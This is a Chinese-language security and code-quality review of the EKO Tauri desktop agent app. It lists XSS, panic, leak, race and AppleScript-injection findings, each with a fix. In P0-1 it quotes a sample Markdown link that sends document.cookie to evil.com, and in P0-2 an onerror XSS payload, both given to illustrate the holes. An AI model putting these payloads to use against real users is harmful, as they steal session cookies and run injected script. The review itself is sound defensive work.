# EKO 项目全面代码审查报告

**审查日期**：2026-07-03
**审查范围**：从 GUI 入口（Tauri `src-tauri/src/main.rs`）出发，覆盖 `echo-agent-cli`（Tauri 后端 + 前端 + app-core）和 `echo-agent`（框架核心），共审查 **100+ 源文件**。

**审查方法**：
- 6 个子代理并行审查不同模块
- 每个模块逐文件检查：panic 风险、UTF-8 安全、竞态条件、内存泄漏、XSS/注入漏洞、AGENTS.md 合规性

---

## 总览

| 严重级别 | 数量 | 说明 |
|----------|------|------|
| 🔴 **P0 - 高危** | 5 | 可导致崩溃 / XSS / 数据丢失 |
| 🟡 **P1 - 中危** | 14 | 内存泄漏、竞态条件、安全薄弱点 |
| 🟢 **P2 - 低危** | 12 | 代码质量、可维护性、性能优化 |
| ✅ **合规通过** | — | 生产代码零 unwrap/expect/panic/字节切片违规 |

---

## 🔴 P0 — 高危发现

### P0-1. XSS：Markdown 链接 `javascript:` 协议注入

- **文件**：`web-frontend/src/components/common/MarkdownContent.tsx:111-117`
- **严重程度**：🔴 HIGH
- **类型**：DOM-based XSS

**问题**：`<a href={href}>` 直接使用 agent/LLM 输出的 URL，未做协议白名单校验。恶意 agent 输出 `[click](javascript:fetch('https://evil.com/?'+document.cookie))` 即可在用户点击时执行任意 JavaScript。

```tsx
// 当前代码（有风险）
a({ href, children }) {
  return (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
},
```

**修复**：使用 `react-markdown` 的 `urlTransform`（v8+）做协议白名单：

```tsx
<ReactMarkdown
  urlTransform={(url) => {
    try {
      const parsed = new URL(url, window.location.origin);
      if (['https:', 'http:', 'mailto:'].includes(parsed.protocol)) return url;
    } catch {}
    return ''; // 不安全协议返回空，链接不可点击
  }}
  ...
>
```

> `rel="noopener noreferrer"` 只防 `window.opener` 攻击，对 `javascript:` 协议无效。协议校验是必需的。

---

### P0-2. XSS：ChartCard 错误处理中的 `innerHTML` 注入

- **文件**：`web-frontend/src/components/chat/ChartCard.tsx:75`
- **严重程度**：🔴 HIGH
- **类型**：DOM-based XSS

**问题**：`document.body.innerHTML = '...' + err.message`，`err.message` 未转义即拼入 HTML。若 Vega-Lite 渲染抛出的错误消息中包含用户可控数据（如非法 spec 内容回显在错误消息中），可注入 `<img src=x onerror=alert(document.domain)>`。

```tsx
// 当前代码（有风险）
document.body.innerHTML = '<p style="color:red;padding:1rem">Chart render error: ' + err.message + '</p>';
```

**修复**：改用 `textContent` 或 DOM API：

```tsx
const p = document.createElement('p');
p.style.cssText = 'color:red;padding:1rem';
p.textContent = 'Chart render error: ' + err.message;
document.body.innerHTML = '';
document.body.appendChild(p);
```

---

### P0-3. Snapshot Mutex 中毒 → panic

- **文件**：`echo-agent/src/agent/snapshot.rs:103`
- **严重程度**：🔴 HIGH
- **类型**：潜在 panic

**问题**：`config.working_dir.lock().unwrap().clone()` — 裸 `.unwrap()` 在 `std::sync::Mutex` 上。若任何持有该锁的线程 panic，Mutex 被毒化（poisoned），此处直接 panic 整个 agent，所有进行中的对话和任务全部丢失。

```rust
// 当前代码（有风险）
working_dir: config.working_dir.lock().unwrap().clone(),
```

**对比**：同一代码库 `react_loop.rs:811` 正确使用了 `.lock().ok()`：

```rust
// react_loop.rs:811 的正确做法
let wd = config.working_dir.lock().ok()?;
```

**修复**：使用一致的安全模式。至少用 `.unwrap_or_else(|e| e.into_inner())` 恢复毒化的锁并打日志，或直接 `.lock().ok()?` 传播错误。

---

### P0-4. 前端 Tauri 事件监听器泄漏

- **文件**：`web-frontend/src/hooks/useTauriChat.ts:87-140`
- **严重程度**：🔴 HIGH
- **类型**：资源泄漏 + 功能异常

**问题**：`setupListener()` 是 async 函数（含两个 `await import()` + 两个 `await listen()`）。cleanup 函数（`useEffect` 返回的函数）同步执行，在组件卸载时检查 `unlistenRef.current?.()`。但若卸载发生在 async imports 期间，`unlistenRef.current` 仍为 null，cleanup 是空操作——而 `listen()` 可能已经注册了原生 Tauri 事件监听器，该句柄**永久丢失**。

后果：
1. **内存泄漏**：未释放的 Tauri 事件监听器持有回调闭包，阻止 GC
2. **幽灵事件**：旧组件的回调在新会话中仍会触发，可能导致状态混乱

**修复**：
```tsx
useEffect(() => {
  const aborted = { current: false };
  const unlistenFns: (() => void)[] = [];

  (async () => {
    const { listen } = await import('@tauri-apps/api/event');
    const unlisten1 = await listen('chat-event', (e) => {
      if (!aborted.current) handleChatEvent(e.payload);
    });
    unlistenFns.push(unlisten1);
    // ... 第二个 listener
  })();

  return () => {
    aborted.current = true;
    unlistenFns.forEach(fn => fn());
  };
}, []);
```

---

### P0-5. AppleScript 启动错误对话框注入

- **文件**：`echo-agent-cli/src/tauri/desktop.rs:103-114`
- **严重程度**：🔴 HIGH
- **类型**：AppleScript 注入（本地提权风险低但违反安全规范）

**问题**：启动失败时，错误消息通过 `format!("{:?}", e).replace('"', "\\\"")` 拼入 AppleScript 字符串。这个转义方法是**已被同一文件第 44-50 行注释明确标记为不安全的**——反斜杠、大括号可逃逸 AppleScript 字符串。panic hook（第 43-64 行）已修复为固定字符串，但启动错误对话框（第 103-114 行）仍在使用旧的不安全模式。

```rust
// 当前代码（有风险 — 第 106-112 行）
.arg(format!(
    "display dialog \"EKO failed to start.\\n\\n\
     Error: {}\\n\\n\
     Crash log: {}\" \
     with title \"EKO\" buttons {{\"OK\"}} default button \"OK\"",
    format!("{:?}", e).replace('"', "\\\""),  // ← 不安全的转义
    log_path.display()
))
```

**修复**：使用与 panic hook（第 56-62 行）相同的固定字符串方案，完整错误日志写入 crash log 文件：

```rust
.arg(
    "display dialog \"EKO failed to start.\\n\\n\
     Details have been written to the crash log.\\n\\n\
     Run from Terminal to see full output:\\n\
     /Applications/EKO.app/Contents/MacOS/echo-agent-cli\" \
     with title \"EKO\" buttons {\"OK\"} default button \"OK\"",
)
```

---

## 🟡 P1 — 中危发现

### 内存泄漏（4个）

#### P1-1. `RUN_EXECUTION_LOCKS` 永不清理

- **文件**：`echo-agent-cli/echo-agent-app-core/src/tasks/task_runtime/task_execute_tool.rs:43-44`
- **类型**：内存泄漏（长期运行影响）

`static RUN_EXECUTION_LOCKS: LazyLock<DashMap<String, Arc<TokioMutex<()>>>>` — 每个 `run_id` 首次执行 `execute_plan` 时插入一个 entry，run 完成后**永不删除**。这是一个进程级静态变量，在 Tauri 长期运行场景下，每个唯一 `run_id` 永久占用内存。预计数月运行后可达数千个无用 entry。应在 run 完成/失败时从 map 中移除对应 key。

#### P1-2. `file_write_locks` 永不清理

- **文件**：`echo-agent-cli/echo-agent-app-core/src/tasks/task_runtime/executor.rs:613-614`
- **类型**：内存泄漏

`file_write_locks: Arc<std::sync::Mutex<HashMap<String, Arc<TokioMutex<()>>>>>` — 每个被任务声明写入的文件在此 map 中创建一个 entry，永不清理。随着不同 run 操作不同文件，map 无限增长。建议在 run 完成时清理该 run 相关的所有文件锁 entry。

#### P1-3. `APPROVAL_NOTIFIES` 在未消费信号时泄漏

- **文件**：`echo-agent-cli/echo-agent-app-core/src/tasks/task_runtime/task_tools.rs:42-43`
- **类型**：内存泄漏

`static APPROVAL_NOTIFIES: LazyLock<DashMap<String, Arc<Notify>>>` — approval signal 的 Notify 对象在以下情况永不清理：
- 工具调用 panic 前未消费
- 用户关闭应用前未审批
- approval 超时但未被正确清理

建议给每个 entry 加 TTL，或在 approval 超时/取消时主动删除。

#### P1-4. Spill-to-disk 临时文件永不删除

- **文件**：`echo-agent/src/agent/react/run/execution.rs:296-317`
- **类型**：磁盘泄漏

工具输出超过 1MB 时 spill 到 `$TMPDIR/echo_agent_spill/`，通过 `tmp.keep()` 持久化后文件路径返回给 LLM，但文件**永不删除**。`echo_agent_spill/` 目录无限增长。应在：
1. conversation 结束时清理，或
2. 给 spill 文件加 TTL（如 1 小时），定期清理过期文件

---

### 竞态条件 & 并发问题（3个）

#### P1-5. 前端并发 sendMessage 无保护

- **文件**：`web-frontend/src/hooks/useTauriChat.ts:142-227`
- **类型**：竞态条件

`sendMessage` 通过多个 ref（`assistantIdRef`、`currentMessageKeyRef`、`thinkingIdRef`）追踪当前消息状态。快速连续调用时，第二个 `sendMessage` 覆盖这些 ref，导致第一个请求的流式响应被错误路由到第二条消息。应加 `sendingRef` 锁，或在 streaming 期间禁用发送按钮。

#### P1-6. Snapshot TOCTOU 竞态

- **文件**：`echo-agent/src/agent/snapshot.rs:717-741`
- **类型**：TOCTOU 竞态

`auto_snapshot` 先获取 `RwLock` 读锁检查 `should_capture`，释放读锁后再获取写锁写入。在两次加锁之间，另一个 task 可能已经为同一 iteration 写入了 snapshot，导致重复写入。应使用 `AtomicBool` 标记或直接在写锁内检查条件。

#### P1-7. TaskRuntime polling 无重叠保护

- **文件**：`web-frontend/src/stores/taskRuntimeStore.ts:102-119`
- **类型**：竞态条件

`setInterval` 每 2 秒调用 `refresh()`，但不检查上一次是否已完成。网络慢时多个 `refresh` 堆叠，且 `Promise.all` 内 5 个并行的 API 调用可能乱序完成，导致状态被旧数据覆盖。应用 `isRefreshing` flag 防止重叠。

---

### 安全问题（3个）

#### P1-8. 附件 URL 无协议校验

- **文件**：`web-frontend/src/components/chat/MessageBubble.tsx:167, 177`
- **类型**：URL 注入

附件 URL（`img.url`、`file.url`）直接用于 `<img src>`、`<a href>` 和 `window.open()`，无协议白名单。若后端存储的 URL 被污染（或攻击者控制的 MCP server 返回恶意 URL），可注入 `javascript:`/`data:` 协议。建议封装 `safeUrl()` 工具函数做协议校验。

#### P1-9. 非 JSON 错误体直接展示

- **文件**：`web-frontend/src/api/client.ts:88-93`
- **类型**：XSS（低概率触发）

非 JSON 错误响应体（如反向代理返回的 HTML 错误页）通过 `toastStore.addToast(errorText, 'error')` 展示。若 `Toast.tsx` 使用 `innerHTML`/`dangerouslySetInnerHTML`，则是 XSS 向量。当前 `Toast.tsx` 使用 React children 渲染（安全），但依赖隐式契约——建议在 client 层截断错误文本（如 `.slice(0, 200)`）防止潜在问题。

#### P1-10. AppleScript 对话框注入

- 同 P0-5，已在高危部分详述。

---

### 数据完整性（2个）

#### P1-11. prepareRegenerate / prepareEditAndResend 不保存

- **文件**：`web-frontend/src/stores/chatStore.ts:370-414`
- **类型**：数据丢失风险

这两个方法修改消息后不调用 `scheduleAutoSave()`。用户编辑消息或触发重生成后若刷新页面（或应用崩溃），修改丢失。应在方法末尾调用 `scheduleAutoSave()`。

#### P1-12. 乐观删除/重命名无回滚

- **文件**：`web-frontend/src/stores/conversationStore.ts:356-382`
- **类型**：数据不一致

`deleteConversation` 和 `renameConversation` 先乐观更新本地状态，再 await API。若 API 失败，UI 已改变但后端未变，刷新后数据"恢复"又"丢失"，用户体验混乱。应先 await API，成功后再更新本地状态。

---

### 其他（2个）

#### P1-13. Agent Pool slot 计数包含 task subagent

- **文件**：`echo-agent-cli/echo-agent-app-core/src/agent_pool.rs:275`
- **类型**：功能缺陷

Pool slot 计数（`active_count`）仅排除 `__background__`，不排除 `__task__:*` task subagent。导致 task subagent 占用用户交互 agent 的并发槽位——后台任务多了，用户发消息可能被拒绝。应将 `__task__:*` 前缀的 agent 一并排除。

#### P1-14. Git worktree 创建阻塞 async executor

- **文件**：`echo-agent-cli/echo-agent-app-core/src/tasks/task_runtime/executor.rs:~2284`
- **类型**：性能

`super::worktree::RunWorktree::create(run_id, root)` 调用 `git worktree add` 子进程，在 async 上下文中同步执行（非 `spawn_blocking`）。这会阻塞 tokio subagent 线程，所有其他 agent 的 I/O 在此期间无法执行。应包裹在 `tokio::task::spawn_blocking()` 中。

---

## 🟢 P2 — 低危发现

### 代码质量（5个）

#### P2-1. 全局快捷键注册失败静默忽略

- **文件**：`echo-agent-cli/src/tauri/mod.rs:295`
- **问题**：`app.global_shortcut().on_shortcut(...).ok();` — 若 `CmdOrCtrl+Shift+E` 被其他 app 占用，用户不知道 toggle 热键没生效。
- **建议**：`if let Err(e) = ... { tracing::warn!("Global shortcut registration failed: {e}"); }`

#### P2-2. 二进制文件 diff 静默返回空

- **文件**：`echo-agent-cli/src/tauri/commands/files.rs:182`
- **问题**：`read_to_string(...).unwrap_or_default()` — 文件为二进制或无效 UTF-8 时，old/new content 静默变为空字符串，diff 输出误导。
- **建议**：返回错误 `Err(IpcError::Internal("File is not valid UTF-8"))`。

#### P2-3. get_config / update_config 代码重复

- **文件**：`echo-agent-cli/src/tauri/commands/config.rs:80-94, 138-152`
- **问题**：两个函数构造完全相同的 `AgentConfigResponse`，约 15 行重复。
- **建议**：提取 `fn build_agent_config_response(state: &TauriState) -> AgentConfigResponse`。

#### P2-4. `_ => continue` 吞掉未来 TaskEvent 变体

- **文件**：`echo-agent-cli/src/tauri/mod.rs:355-356`
- **问题**：`_ => continue` 通配符在 TaskEvent match 中，未来新增变体时编译器不警告。
- **建议**：显式列出当前需要跳过的变体 `Assigned {..} | Deleted {..} => continue`。

#### P2-5. ChatEventLike 不是 discriminated union

- **文件**：`web-frontend/src/hooks/chatEventHandler.ts:13-39`
- **问题**：所有字段都是 optional 的平面接口，导致 handler 中到处 `as any` / 内联 `as` 强制转型，无编译时类型安全。
- **建议**：改为 discriminated union（`type: 'token'` 时确保 `data` 必存在）。

---

### 性能（4个）

#### P2-6. appendThinking 每个 token 创建全量数组副本

- **文件**：`web-frontend/src/stores/chatStore.ts:161-166`
- **问题**：每个 streaming thinking token 创建新的 `segments` 数组副本。长篇 thinking（数千 token）产生显著 GC 压力。
- **建议**：使用可变 draft 模式，或对 thinking 用 append-only 单 segment 累积。

#### P2-7. 加载消息使用非确定性 ID

- **文件**：`web-frontend/src/stores/conversationStore.ts:260`
- **问题**：`id: 'loaded-${Date.now()}-${idx}'` 每次加载生成不同 ID，React key 变化导致消息列表全量重渲染。
- **建议**：使用服务端返回的稳定 ID（如 `message.id` 或 conversation 的确定性 hash）。

#### P2-8. isTauri() 热路径未 memoize

- **文件**：`web-frontend/src/lib/tauri-bridge.ts:17-30`
- **问题**：`isTauri()` 在每次 `request()`、`fileSystem` 调用时重新检查 5 个条件。
- **建议**：改为模块级 `const IS_TAURI = ...`（环境在运行时不变）。

#### P2-9. skill_telemetry 在 tokio::spawn 中做同步文件 I/O

- **文件**：`echo-agent/src/agent/react/run/execution.rs:136-154`
- **问题**：`record_skill_telemetry` 通过 `tokio::spawn` 启动，但内部 `curator.touch_skill()` 是同步文件锁操作，阻塞 tokio subagent 线程。
- **建议**：改用 `tokio::task::spawn_blocking()`。

---

### 其他（3个）

#### P2-10. dirs_home() 返回字面量 `"~"` 作为 fallback

- **文件**：`echo-agent-cli/src/tauri/commands/ipc.rs:111`
- **问题**：若 `HOME` 和 `USERPROFILE` 都未设置，`get_system_info()` 返回 `home_dir: "~"`。仅用于显示时无害，但若有代码将其用作真实路径会失败。
- **建议**：返回空字符串或 `Option<String>`，不要返回假路径。

#### P2-11. 终端 shell 硬编码 Unix（无 Windows 分支）

- **文件**：`echo-agent-cli/src/tauri/commands/terminal.rs:81`
- **问题**：`std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())` 在 Windows 上不可用。
- **建议**：`#[cfg(target_os = "windows")]` 分支使用 `cmd.exe` 或 `powershell.exe`。

#### P2-12. fetch 无超时设置

- **文件**：`web-frontend/src/api/client.ts:58-96`
- **问题**：`fetch` 默认无超时。服务器挂起时 Promise 永不 resolve，UI 永久 loading。
- **建议**：使用 `AbortController` + 30s 超时。

---

## ✅ 值得肯定的设计

1. **`path_validator.rs`** — 纵深防御：词法 `..` 拒绝 + canonical 路径验证 + 密钥文件黑名单（`.ssh/`、`.env` 等）。测试覆盖路径穿越、空路径、大小写不敏感黑名单。
2. **`mcp.rs`** — 全面输入验证：stdio 可执行文件白名单、shell 元字符拒绝、SSRF 防护（私有 IP 范围 + 环回阻止）、HTTPS-only 要求、密钥脱敏响应。单测覆盖所有路径。
3. **`terminal.rs`** — 每次会话独立 consent gate（`AtomicBool` 防 XSS 驱动 shell 注入），写大小上限 64KB，审计日志记录，纵深防御到位。
4. **`chat.rs` (Tauri commands)** — Cancel token 隔离（chat 轮次 vs 后台 run），HITL 请求 300s 超时防僵死。
5. **AGENTS.md 合规** — 生产代码中**零** `.unwrap()`/`.expect()`/`panic!`/`todo!`/`unreachable!`/字节切片违规。所有不安全操作均使用安全的 `unwrap_or`/`unwrap_or_else`/`unwrap_or_default` 变体。唯一的测试代码 `.unwrap()` 是 Rust 测试惯用法，无生产风险。
6. **ChartCard.tsx** — 沙箱化 iframe（无 `allow-same-origin`）+ JSON 特殊字符转义（`</` → `<\/`）防 `</script>` 逃逸 + `script type="application/json"` 安全嵌入。虽然 P0-2 的 `innerHTML` 漏洞破坏了部分防护，但设计思路正确。
7. **所有 React 组件** — 无 `dangerouslySetInnerHTML`，无 `eval()`/`new Function()`，用户数据均通过 React children 自动转义渲染。

---

## 修复优先级建议

### 立即修复（本轮）

| # | 问题 | 改动量 | 风险 |
|---|------|--------|------|
| P0-1 | MarkdownContent XSS — 协议白名单 | ~5 行 | 低 |
| P0-2 | ChartCard innerHTML XSS — 改用 textContent | ~3 行 | 低 |
| P0-3 | Snapshot Mutex poison — `.ok()?` 传播 | 1 行 | 低 |
| P0-5 | AppleScript 注入 — 复制 panic hook 的固定字符串 | ~5 行 | 低 |

### 近期修复（下个迭代）

| # | 问题 | 改动量 | 风险 |
|---|------|--------|------|
| P0-4 | 前端事件监听器泄漏 | ~15 行 | 中（需测试） |
| P1-1/2/3 | 3 个内存泄漏（DashMap/HashMap 清理） | 各 ~5-10 行 | 低 |
| P1-4 | Spill 文件清理 | ~10 行 | 低 |
| P1-5 | 并发 sendMessage 保护 | ~10 行 | 中 |
| P1-11 | prepareRegenerate 保存 | ~2 行 | 低 |
| P1-12 | 乐观更新回滚 | ~5 行 | 低 |
| P1-13 | Pool slot 计数 bug | ~3 行 | 低 |
| P1-14 | Git worktree spawn_blocking | ~3 行 | 低 |

### 后续优化

| # | 问题 | 改动量 |
|---|------|--------|
| P2-2 | 二进制 diff 返回错误 | ~2 行 |
| P2-3 | config.rs 去重 | ~20 行 |
| P2-4 | `_ => continue` 显式化 | ~1 行 |
| P2-5 | ChatEventLike discriminated union | ~30 行 |
| P2-8 | isTauri memoize | ~2 行 |
| P2-9 | skill_telemetry spawn_blocking | ~2 行 |
| P2-12 | fetch 超时 | ~5 行 |

---

## 审查统计

| 维度 | 数据 |
|------|------|
| 审查文件总数 | 100+ |
| 部署的子代理 | 6 个（并行） |
| P0 高危发现 | 5 个（2 XSS + 1 panic + 1 泄漏 + 1 注入） |
| P1 中危发现 | 14 个（4 泄漏 + 3 竞态 + 3 安全 + 2 数据 + 2 其他） |
| P2 低危发现 | 12 个（5 质量 + 4 性能 + 3 其他） |
| AGENTS.md 合规 | ✅ 通过（生产代码零违规） |
| XSS 漏洞 | 2 个 HIGH |
| 内存泄漏 | 4 个 |
| 竞态条件 | 3 个 |
